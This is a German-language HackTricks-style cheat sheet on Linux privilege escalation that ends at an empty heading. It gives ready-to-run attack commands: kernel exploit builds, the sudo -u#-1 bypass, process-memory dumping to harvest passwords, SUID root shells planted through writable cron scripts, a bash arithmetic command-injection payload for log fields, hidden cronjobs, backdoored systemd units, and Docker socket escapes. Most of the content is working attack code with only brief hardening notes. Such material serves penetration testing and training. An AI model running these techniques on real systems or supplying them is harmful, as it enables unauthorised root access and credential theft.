# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Systeminformationen

### OS-Informationen

Beginnen wir damit, Informationen über das laufende Betriebssystem zu sammeln.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Wenn du **Schreibrechte auf einen Ordner innerhalb der `PATH`-Variable** hast, kannst du möglicherweise einige libraries oder binaries hijacken:
```bash
echo $PATH
```
### Env info

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Überprüfe die Kernel-Version und ob es einen exploit gibt, der zur privilege escalation verwendet werden kann
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Sie finden eine gute Liste verwundbarer Kernel und einige bereits **compiled exploits** hier: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Andere Seiten, auf denen Sie einige **compiled exploits** finden können: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernel-Versionen von dieser Webseite zu extrahieren, können Sie folgendes tun:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die dir bei der Suche nach kernel exploits helfen können, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ausführen IN victim, überprüft nur Exploits für Kernel 2.x)

Suche immer **die Kernel-Version in Google**, vielleicht ist deine Kernel-Version in einem Kernel-Exploit genannt und dann weißt du, dass dieser Exploit gültig ist.

Additional kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-Version

Basierend auf den anfälligen sudo-Versionen, die in:
```bash
searchsploit sudo
```
Du kannst prüfen, ob die sudo-Version verwundbar ist, indem du dieses grep verwendest.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo-Versionen vor 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) ermöglichen es nicht-privilegierten lokalen Benutzern, ihre Privilegien zu root zu eskalieren über die sudo-Option `--chroot`, wenn die Datei `/etc/nsswitch.conf` aus einem vom Benutzer kontrollierten Verzeichnis verwendet wird.

Hier ist ein [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot), um diese [Schwachstelle](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) auszunutzen. Bevor Sie den Exploit ausführen, stellen Sie sicher, dass Ihre `sudo`-Version verwundbar ist und `chroot` unterstützt.

Für weitere Informationen siehe die ursprüngliche [Sicherheitsmitteilung](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg Signaturprüfung fehlgeschlagen

Sieh dir die **smasher2 box von HTB** für ein **Beispiel** an, wie diese vuln ausgenutzt werden könnte
```bash
dmesg 2>/dev/null | grep "signature"
```
### Mehr system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Abwehrmaßnahmen auflisten

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Wenn du dich in einem docker container befindest, kannst du versuchen, daraus zu entkommen:


{{#ref}}
docker-security/
{{#endref}}

## Laufwerke

Prüfe **what is mounted and unmounted**, wo und warum. Falls etwas unmounted ist, könntest du versuchen, es zu mounten und nach privaten Informationen zu suchen.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Nützliche binaries auflisten
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Prüfe außerdem, ob **irgendein Compiler installiert ist**. Das ist nützlich, wenn du einen kernel exploit verwenden musst, da empfohlen wird, ihn auf der Maschine zu kompilieren, auf der du ihn verwenden wirst (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Installierte verwundbare Software

Überprüfe die **Versionen der installierten Pakete und Dienste**. Vielleicht gibt es z. B. eine alte Nagios-Version, die ausgenutzt werden könnte, um Privilegieneskalation zu ermöglichen…\
Es empfiehlt sich, die Version verdächtiger installierter Software manuell zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Wenn du SSH-Zugang zur Maschine hast, kannst du auch **openVAS** verwenden, um auf der Maschine installierte veraltete und verwundbare Software zu überprüfen.

> [!NOTE] > _Beachte, dass diese Befehle viele Informationen anzeigen, die größtenteils nutzlos sind; daher wird empfohlen, Anwendungen wie OpenVAS oder ähnliche zu verwenden, die prüfen, ob eine installierte Softwareversion gegen bekannte Exploits verwundbar ist_

## Prozesse

Schau dir an, **welche Prozesse** ausgeführt werden und prüfe, ob ein Prozess **mehr Rechte hat, als er sollte** (vielleicht läuft ein tomcat als root?).
```bash
ps aux
ps -ef
top -n 1
```
Prüfe immer auf mögliche [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** erkennt diese, indem es den `--inspect` Parameter in der Kommandozeile des Prozesses prüft.\
Auch **überprüfe deine Berechtigungen an den Binaries der Prozesse**, vielleicht kannst du eines überschreiben.

### Prozessüberwachung

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Das kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn bestimmte Voraussetzungen erfüllt sind.

### Prozessspeicher

Einige Dienste eines Servers speichern **credentials im Klartext im Speicher**.\
Normalerweise benötigst du **root privileges**, um den Speicher von Prozessen anderer Benutzer zu lesen; daher ist dies meist nützlicher, wenn du bereits root bist und weitere credentials finden möchtest.\
Denke jedoch daran, dass du **als normaler Benutzer den Speicher der Prozesse lesen kannst, die dir gehören**.

> [!WARNING]
> Beachte, dass heutzutage die meisten Maschinen **ptrace standardmäßig nicht erlauben**, was bedeutet, dass du keine anderen Prozesse dumpen kannst, die zu deinem nicht-privilegierten Benutzer gehören.
>
> Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert die Zugänglichkeit von ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle Prozesse können debuggt werden, solange sie die gleiche uid haben. Dies ist die klassische Arbeitsweise von ptrace.
> - **kernel.yama.ptrace_scope = 1**: nur ein Parent-Prozess kann debuggt werden.
> - **kernel.yama.ptrace_scope = 2**: Nur admin kann ptrace verwenden, da die CAP_SYS_PTRACE capability erforderlich ist.
> - **kernel.yama.ptrace_scope = 3**: Keine Prozesse dürfen mit ptrace getraced werden. Nach dem Setzen ist ein Reboot nötig, um ptracing wieder zu ermöglichen.

#### GDB

Wenn du Zugriff auf den Speicher eines FTP-Services (zum Beispiel) hast, könntest du den Heap bekommen und darin nach credentials suchen.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigen **maps, wie der Speicher im virtuellen Adressraum dieses Prozesses gemappt ist**; sie zeigen außerdem die **Berechtigungen jeder gemappten Region**. Die Pseudo-Datei **mem** **macht den Speicher des Prozesses selbst zugänglich**. Aus der **maps**-Datei wissen wir, welche **Speicherbereiche lesbar sind** und deren Offsets. Wir verwenden diese Informationen, um in die **mem**-Datei zu seeken und alle lesbaren Regionen in eine Datei zu dumpen.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bietet Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Auf den virtuellen Adressraum des Kernels kann über `/dev/kmem` zugegriffen werden.\
Typischerweise ist `/dev/mem` nur für **root** und die Gruppe **kmem** lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für linux

ProcDump ist eine Neuinterpretation für Linux des klassischen ProcDump-Tools aus der Sysinternals-Tool-Suite für Windows. Erhältlich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Werkzeuge

Um den Speicher eines Prozesses zu dumpen, kannst du Folgendes verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Du kannst manuell die root-Anforderungen entfernen und den von dir betriebenen Prozess dumpen
- Script A.5 von [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Zugangsdaten aus Prozessspeicher

#### Manuelles Beispiel

Wenn du feststellst, dass der authenticator-Prozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst den Prozess dumpen (siehe frühere Abschnitte, um verschiedene Wege zu finden, den Speicher eines Prozesses zu dumpen) und nach credentials im Speicher suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **Klartext-Anmeldeinformationen aus dem Speicher stehlen** und aus einigen **bekannten Dateien**. Es erfordert Root-Rechte, um richtig zu funktionieren.

| Funktion                                          | Prozessname          |
| ------------------------------------------------- | -------------------- |
| GDM-Passwort (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktive FTP-Verbindungen)                  | vsftpd               |
| Apache2 (aktive HTTP Basic-Auth-Sitzungen)        | apache2              |
| OpenSSH (aktive SSH-Sitzungen - Sudo-Nutzung)     | sshd:                |

#### Such-Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron-Jobs

### Crontab UI (alseambusher) läuft als root – web-basierter Scheduler privesc

Wenn ein Web‑„Crontab UI“-Panel (alseambusher/crontab-ui) als root läuft und nur an loopback gebunden ist, kannst du es trotzdem über SSH local port-forwarding erreichen und einen privilegierten Job erstellen, um eine Privilegieneskalation durchzuführen.

Typische Kette
- Entdecke nur an loopback gebundenen Port (z. B. 127.0.0.1:8000) und Basic-Auth-Realm via `ss -ntlp` / `curl -v localhost:8000`
- Find credentials in operational artifacts:
- Backups/scripts with `zip -P <password>`
- systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Erstelle einen hochprivilegierten Job und führe ihn sofort aus (legt eine SUID-Shell ab):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
Benutze es:
```bash
/tmp/rootshell -p   # root shell
```
Absicherung
- Führen Sie Crontab UI nicht als root aus; beschränken Sie es auf einen dedizierten Benutzer mit minimalen Rechten
- An localhost binden und zusätzlich den Zugriff via firewall/VPN einschränken; verwenden Sie keine wiederverwendeten Passwörter
- Vermeiden Sie das Einbetten von secrets in unit files; nutzen Sie secret stores oder eine nur für root zugängliche EnvironmentFile
- Aktivieren Sie audit/logging für on-demand job executions



Prüfen Sie, ob ein geplanter Job verwundbar ist. Vielleicht können Sie ein Script ausnutzen, das von root ausgeführt wird (wildcard vuln? Dateien, die root verwendet, modifizieren? symlinks verwenden? bestimmte Dateien im Verzeichnis erstellen, das root verwendet?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-Pfad

Zum Beispiel findest du in _/etc/crontab_ den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer "user" Schreibrechte auf /home/user hat_)

Wenn innerhalb dieser crontab der root user versucht, einen Befehl oder ein Script auszuführen, ohne den PATH zu setzen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\

Dann kannst du eine root shell erhalten, indem du Folgendes verwendest:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron mit einem script, das ein wildcard verwendet (Wildcard Injection)

Wenn ein script, das von root ausgeführt wird, ein “**\***” innerhalb eines Befehls enthält, können Sie dies ausnutzen, um unerwartete Dinge zu erreichen (z. B. privesc). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn das Wildcard einem Pfad wie** _**/some/path/\***_ **vorausgeht, ist es nicht verwundbar (auch** _**./\***_ **ist es nicht).**

Lies die folgende Seite für mehr Wildcard-Exploitation-Tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash führt parameter expansion und command substitution aus, bevor die arithmetische Auswertung in ((...)), $((...)) und let erfolgt. Wenn ein root cron/parser nicht vertrauenswürdige Log-Felder liest und diese in einen arithmetischen Kontext einspeist, kann ein Angreifer eine command substitution $(...) injizieren, die beim Ausführen des cron als root ausgeführt wird.

- Warum das funktioniert: In Bash erfolgen die Expansionen in dieser Reihenfolge: parameter/variable expansion, command substitution, arithmetic expansion, dann word splitting und pathname expansion. Ein Wert wie `$(/bin/bash -c 'id > /tmp/pwn')0` wird also zuerst substituiert (der Befehl läuft), danach wird die verbleibende Ziffer `0` für die Arithmetik verwendet, sodass das Script ohne Fehler weiterläuft.

- Typisches verwundbares Muster:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Schreibe angreifer-kontrollierten Text in das zu parsende Log, sodass das zahlenähnliche Feld eine command substitution enthält und mit einer Ziffer endet. Sorge dafür, dass dein Befehl nichts auf stdout ausgibt (oder leite die Ausgabe um), damit die Arithmetik gültig bleibt.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das von root ausgeführte script ein **directory, auf das du vollen Zugriff hast**, verwendet, könnte es nützlich sein, diesen folder zu löschen und **einen symlink folder zu einem anderen zu erstellen**, der ein von dir kontrolliertes script bereitstellt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Häufige cron-Jobs

Du kannst die Prozesse überwachen, um nach Prozessen zu suchen, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht kannst du das ausnutzen und escalate privileges.

Zum Beispiel, um **alle 0,1 s für 1 Minute überwachen**, **nach den am wenigsten ausgeführten Befehlen sortieren** und die Befehle zu löschen, die am häufigsten ausgeführt wurden, kannst du Folgendes tun:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Du kannst auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dies überwacht und listet jeden gestarteten Prozess).

### Unsichtbare cronjobs

Es ist möglich, einen cronjob zu erstellen, indem man **einen carriage return nach einem Kommentar setzt** (ohne newline character), und der cronjob funktioniert. Beispiel (achte auf das carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Schreibbare _.service_ Dateien

Prüfe, ob du eine `.service`-Datei schreiben kannst; wenn du das kannst, **könntest du sie so ändern**, sodass sie deine **backdoor** **ausführt**, **wenn** der Dienst **gestartet**, **neu gestartet** oder **gestoppt** wird (vielleicht musst du warten, bis die Maschine neu gestartet wird).\
Erstelle zum Beispiel deine backdoor innerhalb der .service-Datei mit **`ExecStart=/tmp/script.sh`**

### Schreibbare service-Binaries

Beachte, dass wenn du **Schreibrechte an Binaries hast, die von services ausgeführt werden**, du diese zu backdoors ändern kannst, sodass beim erneuten Ausführen der services die backdoors ausgeführt werden.

### systemd PATH - Relative Pfade

Du kannst den von **systemd** verwendeten PATH mit folgendem Befehl sehen:
```bash
systemctl show-environment
```
Wenn Sie feststellen, dass Sie in einem der Ordner des Pfads **schreiben** können, können Sie möglicherweise **escalate privileges**. Sie müssen nach **relative Pfade, die in Service-Konfigurationsdateien verwendet werden** suchen wie:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Erstelle dann eine ausführbare Datei mit demselben Namen wie die relativen Pfad-Binary innerhalb des systemd PATH-Ordners, den du beschreiben kannst, und wenn der Service aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird dein backdoor ausgeführt (nicht-privilegierte Benutzer können normalerweise keine Services starten/stoppen, prüfe jedoch, ob du `sudo -l` verwenden kannst).

**Erfahre mehr über Services mit `man systemd.service`.**

## **Timers**

**Timers** sind systemd-Unit-Dateien, deren Name in `**.timer**` endet und die `**.service**`-Dateien oder Ereignisse steuern. **Timers** können als Alternative zu cron verwendet werden, da sie eingebaute Unterstützung für Kalenderzeit-Ereignisse und monotone Zeit-Ereignisse bieten und asynchron ausgeführt werden können.

Du kannst alle Timer mit folgendem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Beschreibbare Timer

Wenn du einen Timer ändern kannst, kannst du ihn dazu bringen, einige existierende Units von systemd.unit auszuführen (wie eine `.service` oder eine `.target`)
```bash
Unit=backdoor.service
```
In der Dokumentation können Sie nachlesen, was eine Unit ist:

> Die Unit, die aktiviert werden soll, wenn dieser Timer abläuft. Das Argument ist ein Unit-Name, dessen Suffix nicht ".timer" ist. Wenn nicht angegeben, fällt dieser Wert standardmäßig auf einen service zurück, der denselben Namen wie die timer unit trägt, abgesehen vom Suffix. (Siehe oben.) Es wird empfohlen, dass der zu aktivierende Unit-Name und der Unit-Name der timer unit identisch benannt sind, abgesehen vom Suffix.

Deshalb müssten Sie, um diese Berechtigung auszunutzen, folgendes tun:

- Finden Sie eine systemd Unit (wie eine `.service`), die ein **schreibbares Binary** ausführt
- Finden Sie eine systemd Unit, die einen **relativen Pfad** ausführt, und auf deren **systemd PATH** Sie **Schreibrechte** haben (um dieses ausführbare Programm zu imitieren)

**Mehr über Timer erfahren Sie mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren benötigen Sie root-Rechte und müssen Folgendes ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **Prozesskommunikation** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets können mit `.socket`-Dateien konfiguriert werden.

**Learn more about sockets with `man systemd.socket`.** Innerhalb dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen unterscheiden sich, aber eine Zusammenfassung wird verwendet, um **anzugeben, wo gelauscht werden soll** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6-Adresse und/oder Portnummer, etc.)
- `Accept`: Akzeptiert ein boolean-Argument. Wenn **true**, wird für jede eingehende Verbindung eine **Service-Instanz gestartet** und nur die Verbindungs-Socket an diese übergeben. Wenn **false**, werden alle Listening-Sockets selbst an die gestartete Service-Einheit **übergeben**, und es wird nur eine Service-Einheit für alle Verbindungen gestartet. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, wo eine einzelne Service-Einheit bedingungslos allen eingehenden Traffic verarbeitet. **Defaults to false**. Aus Leistungsgründen wird empfohlen, neue Daemons nur so zu schreiben, dass sie für `Accept=no` geeignet sind.
- `ExecStartPre`, `ExecStartPost`: Nehmen eine oder mehrere Befehlszeilen an, die jeweils **ausgeführt werden bevor** bzw. **nachdem** die Listening-**sockets**/FIFOs **erstellt** und gebunden werden. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die jeweils **ausgeführt werden bevor** bzw. **nachdem** die Listening-**sockets**/FIFOs **geschlossen** und entfernt werden.
- `Service`: Gibt den Namen der **service**-Einheit an, die bei **eingehendem Traffic** **aktiviert** werden soll. Diese Einstellung ist nur für Sockets mit Accept=no erlaubt. Standardmäßig ist es der Service, der denselben Namen wie die Socket trägt (mit ersetzter Endung). In den meisten Fällen sollte es nicht notwendig sein, diese Option zu verwenden.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Beachte, dass es möglicherweise einige **sockets listening for HTTP** Anfragen gibt (_Ich spreche nicht von .socket-Dateien, sondern von Dateien, die als unix sockets fungieren_). Das kannst du mit folgendem Befehl prüfen:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Wenn der Socket **auf eine HTTP-Anfrage antwortet**, kannst du **mit ihm kommunizieren** und vielleicht **eine Schwachstelle ausnutzen**.

### Schreibbarer Docker Socket

Der Docker Socket, häufig zu finden unter `/var/run/docker.sock`, ist eine kritische Datei, die gesichert werden sollte. Standardmäßig ist er für den Benutzer `root` und Mitglieder der `docker`-Gruppe beschreibbar. Schreibzugriff auf diesen Socket kann zu privilege escalation führen. Hier ist eine Aufschlüsselung, wie das gemacht werden kann, und alternative Methoden, falls die Docker CLI nicht verfügbar ist.

#### **Privilege Escalation with Docker CLI**

Wenn du Schreibzugriff auf den Docker Socket hast, kannst du mit den folgenden Befehlen escalate privileges erlangen:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Diese Befehle ermöglichen es, einen Container mit root-Level-Zugriff auf das Dateisystem des Hosts auszuführen.

#### **Docker API direkt verwenden**

In Fällen, in denen die Docker CLI nicht verfügbar ist, kann der Docker-Socket weiterhin über die Docker API und `curl`-Befehle manipuliert werden.

1.  **List Docker Images:** Ruft die Liste der verfügbaren Images ab.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Sende eine Anfrage, um einen Container zu erstellen, der das Root-Verzeichnis des Hosts einbindet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Starte den neu erstellten Container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Verwende `socat`, um eine Verbindung zum Container herzustellen und die Ausführung von Befehlen darin zu ermöglichen.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nach dem Einrichten der `socat`-Verbindung kannst du Befehle direkt im Container mit root-Level-Zugriff auf das Dateisystem des Hosts ausführen.

### Others

